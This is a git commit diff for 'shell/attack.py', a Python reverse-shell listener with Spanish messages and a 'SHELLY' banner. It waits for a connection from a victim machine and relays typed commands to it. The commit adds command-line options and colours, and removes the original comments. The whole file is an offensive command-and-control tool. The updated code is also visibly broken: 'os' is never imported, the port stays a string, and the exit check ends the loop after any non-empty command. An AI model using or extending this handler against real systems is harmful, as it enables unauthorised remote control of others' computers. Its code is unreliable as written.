528988b9e7ed30d724dd63a57ee21a20739c492b
Phoenix <158185295+ZombieGeeK0@users.noreply.github.com>
2024-04-29 12:43:43 +0200

    Update attack.py

--- shell/attack.py
+++ shell/attack.py
@@ -1,36 +1,58 @@
-import socket
+import socket, argparse
+from colorama import *
 
-# Definimos la dirección IP y el puerto del servidor de escucha
-HOST = '192.168.103.93'  # Escucha en todas las interfaces
-PORT = 4444       # Puerto de escucha
+parser = argparse.ArgumentParser()
 
-# Creamos un socket para la conexión
+parser.add_argument('--target', '-t', help="Indica la IP objetivo")
+parser.add_argument('--port', '-p', help="Indica el puerto por el que realizar la conexión")
+
+args = parser.parse_args()
+
+def clear():
+  if os.name == "nt":
+    os.system("cls")
+  else:
+    os.system("clear")
+
+class color:
+    RED = Style.BRIGHT + Fore.RED
+    WHITE = Style.BRIGHT + Fore.WHITE
+    RESET = Style.RESET_ALL + Fore.RESET
+
+def print_title():
+    clear()
+    title = '''
+███████╗██╗  ██╗███████╗██╗     ██╗  ██╗   ██╗
+██╔════╝██║  ██║██╔════╝██║     ██║  ╚██╗ ██╔╝
+███████╗███████║█████╗  ██║     ██║   ╚████╔╝ 
+╚════██║██╔══██║██╔══╝  ██║     ██║    ╚██╔╝  
+███████║██║  ██║███████╗███████╗███████╗██║   
+╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  
+'''
+    print(color.RED + title)
+
+HOST = args.target
+PORT = args.port
+
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-# Enlazamos el socket al puerto y comenzamos a escuchar conexiones
 s.bind((HOST, PORT))
 s.listen(1)
 
-print(f"[*] Escuchando en {HOST}:{PORT}")
+print(color.WHITE + f'[*] Escuchando conexiones en {HOST}:{PORT}')
 
-# Aceptamos la conexión entrante
 conn, addr = s.accept()
-print(f"[+] Conexión entrante desde: {addr[0]}:{addr[1]}")
+print(color.WHITE + f'[+] Conexión entrante: {addr[0]}:{addr[1]}')
 
-# Interacción con el usuario
 while True:
-    command = input("Shell> ")
+    command = input(color.WHITE + f'shelly@{PORT}:~$ ')
     
-    # Enviamos el comando a la víctima
     conn.send(command.encode())
     
-    # Si el comando es "exit", cerramos la conexión
-    if command.strip() == "exit":
+    if command.strip() or command.lower() == "exit":
         break
     
-    # Recibimos y mostramos la salida del comando ejecutado por la víctima
     output = conn.recv(1024).decode()
-    print(output)
+    print(color.WHITE + output)
 
-# Cerramos la conexión
 conn.close()
